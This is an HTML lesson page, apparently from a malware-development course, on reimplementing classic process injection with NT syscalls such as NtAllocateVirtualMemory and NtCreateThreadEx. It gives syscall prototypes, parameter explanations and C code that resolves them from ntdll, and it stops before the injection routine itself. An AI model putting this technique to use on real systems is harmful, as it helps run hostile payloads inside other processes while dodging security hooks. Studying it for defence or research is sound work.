@@ -1,0 +1,754 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Syscalls - Reimplementing Classic Injection</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="syscalls-reimplementing-classic-injection" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="terminal" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent2)] flex-shrink-0"></i>
+                <span>Syscalls - Reimplementing Classic Injection</span>
+            </h2>
+            <a href="#syscalls-reimplementing-classic-injection" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this module, the classical process injection technique discussed earlier will be implemented using direct syscalls, replacing WinAPIs with their syscall equivalent.</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualAlloc/Ex</code> is replaced with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtAllocateVirtualMemory</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualProtect/Ex</code> is replaced with <a href="http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Memory%20Management/Virtual%20Memory/NtProtectVirtualMemory.html" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtProtectVirtualMemory</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WriteProcessMemory</code> is replaced with <a href="http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Memory%20Management/Virtual%20Memory/NtWriteVirtualMemory.html" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtWriteVirtualMemory</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateThread/RemoteThread</code> is replaced with <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2228" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">NtCreateThreadEx</a></span></div><h3 id="required-syscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Required Syscalls</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section will go through the required syscalls that will be used and explain their parameters.</p><h3 id="ntallocatevirtualmemory" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtAllocateVirtualMemory</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualAlloc</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualAllocEx</code> WinAPIs. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtAllocateVirtualMemory(
+  IN HANDLE           ProcessHandle,    // Process handle in where to allocate memory
+  IN OUT PVOID        *BaseAddress,     // The returned allocated memory&#x27;s base address
+  IN ULONG_PTR        ZeroBits,         // Always set to &#x27;0&#x27;
+  IN OUT PSIZE_T      RegionSize,       // Size of memory to allocate
+  IN ULONG            AllocationType,   // MEM_COMMIT | MEM_RESERVE
+  IN ULONG            Protect           // Page protection
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> is similar to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualAllocEx</code> WinAPI, however, it differs in that the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">BaseAddress</code> are both passed by reference, using the address of operator (&amp;). <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ZeroBits</code> is a newly introduced parameter that is defined as the number of high-order address bits that must be zero in the base address of the section view. This parameter is always set to zero.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> parameter is marked as an IN and OUT parameter. This is because the value of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> may change depending on what was actually allocated. Microsoft states that the initial value of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> specifies the size, in bytes, of the region and is rounded up to the next host page size boundary. This means that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> rounds up to the nearest multiple of a page size, which is 4096 bytes. For example, if <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> is set to 5000 bytes, it will round it up to 8192 and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> will return the value which was allocated, which is 8192 in this example.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As previously mentioned in earlier modules, all the syscalls return <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NTSTATUS</code>. If successful, it will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">STATUS_SUCCESS</code> (0). Otherwise, a non-zero value is returned if the syscall <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory#return-value" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">fails</a>.</p><h3 id="ntprotectvirtualmemory" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtProtectVirtualMemory</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualProtect</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VirtualProtectEx</code> WinAPIs. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtProtectVirtualMemory(
+  IN HANDLE               ProcessHandle,              // Process handle whose memory protection is to be changed
+  IN OUT PVOID            *BaseAddress,               // Pointer to the base address to protect
+  IN OUT PULONG           NumberOfBytesToProtect,     // Pointer to size of region to protect
+  IN ULONG                NewAccessProtection,        // New memory protection to be set
+  OUT PULONG              OldAccessProtection         // Pointer to a variable that receives the previous access protection
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Both <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">BaseAddress</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NumberOfBytesToProtect</code> are passed by reference, using the &quot;address of&quot; operator (&amp;).</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NumberOfBytesToProtect</code> parameter behaves similarly to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RegionSize</code> parameter in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory</code> where it rounds up the number of bytes to the nearest multiple of a page.</p><h3 id="ntwritevirtualmemory" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtWriteVirtualMemory</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WriteProcessMemory</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtWriteVirtualMemory</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtWriteVirtualMemory(
+  IN HANDLE               ProcessHandle,          // Process handle whose memory is to be written to
+  IN PVOID                BaseAddress,            // Base address in the specified process to which data is written
+  IN PVOID                Buffer,                 // Data to be written
+  IN ULONG                NumberOfBytesToWrite,   // Number of bytes to be written
+  OUT PULONG              NumberOfBytesWritten    // Pointer to a variable that receives the number of bytes actually written
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtWriteVirtualMemory</code>&#x27;s parameters are the same as its WinAPI version, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WriteProcessMemory</code>.</p><h3 id="ntcreatethreadex" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtCreateThreadEx</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the resulting syscall from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateThread</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateRemoteThread</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateRemoteThreadEx</code> WinAPIs. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateThreadEx</code> is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">NTSTATUS NtCreateThreadEx(
+    OUT PHANDLE                 ThreadHandle,         // Pointer to a HANDLE variable that recieves the created thread&#x27;s handle
+    IN 	ACCESS_MASK             DesiredAccess,        // Thread&#x27;s access rights (set to THREAD_ALL_ACCESS - 0x1FFFFF)
+    IN 	POBJECT_ATTRIBUTES      ObjectAttributes,     // Pointer to OBJECT_ATTRIBUTES structure (set to NULL)
+    IN 	HANDLE                  ProcessHandle,        // Handle to the process in which the thread is to be created.
+    IN 	PVOID                   StartRoutine,         // Base address of the application-defined function to be executed
+    IN 	PVOID                   Argument,             // Pointer to a variable to be passed to the thread function (set to NULL)
+    IN 	ULONG                   CreateFlags,          // The flags that control the creation of the thread (set to NULL)
+    IN 	SIZE_T                  ZeroBits,             // Set to NULL
+    IN 	SIZE_T                  StackSize,            // Set to NULL
+    IN 	SIZE_T                  MaximumStackSize,     // Set to NULL
+    IN 	PPS_ATTRIBUTE_LIST      AttributeList         // Pointer to PS_ATTRIBUTE_LIST structure (set to NULL)
+);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateThreadEx</code> looks similar to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">CreateRemoteThreadEx</code> WinAPI. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateThreadEx</code> is a very flexible syscall and can allow complex manipulation of the created threads. However, for our purpose, the majority of its parameters will be set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NULL</code>.</p><h3 id="implementation-using-getprocaddress-and-getmodulehandle" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Implementation Using GetProcAddress and GetModuleHandle</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Calling the syscalls will be done using several methods, starting with the commonly used <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddress</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetModuleHandle</code> WinAPIs. This technique is straightforward and has been used multiple times to dynamically call syscalls. As previously discussed, however, this method does not bypass any userland hooks installed on the syscalls.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the code provided for download in this module, a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Syscall</code> structure is created and initialized using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">// A structure that keeps the syscalls used
+typedef struct _Syscall {
+
+	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
+	fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
+	fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
+	fnNtCreateThreadEx        pNtCreateThreadEx;
+
+} Syscall, *PSyscall;
+
+
+// Function used to populate the input &#x27;St&#x27; structure
+BOOL InitializeSyscallStruct (OUT PSyscall St) {
+
+	HMODULE hNtdll = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
+	if (!hNtdll) {
+		printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
+	St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
+	St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
+	St-&gt;pNtCreateThreadEx         = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);
+
+        // check if GetProcAddress missed a syscall
+	if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtCreateThreadEx == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ClassicInjectionViaSyscalls</code> function will be responsible for executing the payload, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pPayload</code>, in the target process, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">hProcess</code>. The function returns <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FALSE</code> if it fails to execute the payload and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TRUE</code> if it succeeds. Additionally, the function can be used to inject both local and remote processes depending on the value of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">hProcess</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
